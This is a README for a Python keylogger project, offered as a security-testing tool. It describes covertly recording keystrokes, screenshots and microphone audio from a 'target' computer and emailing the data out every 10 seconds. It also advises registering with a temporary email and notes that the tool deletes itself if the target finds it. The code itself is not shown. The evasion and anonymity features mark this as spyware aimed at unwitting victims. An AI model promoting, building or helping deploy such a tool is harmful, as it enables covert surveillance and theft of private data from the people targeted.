# KeySense-Keylogger
# Keylogger & Information Security Tester

**Capture Keyboard, Screenshot, and Microphone Inputs, and Securely Transmit Them to Your Designated Email Address. This project serves the purpose of conducting comprehensive security assessments on information systems.**

## Overview

This Python script is designed for information security professionals and ethical hackers to assess the security of information systems. It enables the capture and transmission of sensitive information from a target computer to a designated email address. The script performs the following functions:

- Captures keyboard inputs, monitoring keystrokes on the target system.
- Takes screenshots of the target system's desktop at specified intervals.
- Records audio from the target system's microphone.
- Securely transmits the captured data to a predefined email address for analysis.

## Installation

**No installation required, just run the script.**

![GitHub](https://github.com/Sandeep060/KeySense-Keylogger/blob/main/images/email_mailtrappng.png)

## Usage

1. **Create an account on "https://mailtrap.io/" using a temporary email.**

![GitHub](https://github.com/Sandeep060/KeySense-Keylogger/blob/main/images/mailtrap.png)

2. **Set your SMTP USERNAME and SMTP PASSWORD in "keylogger.py".**

3. Run the following commands:
   - `pip install -r requirements.txt`
   - `python3 keylogger.py`

4. Data from the target computer will be sent every 10 seconds.

5. If the target discovers the code and opens the file to learn your email and password, the program will delete itself.
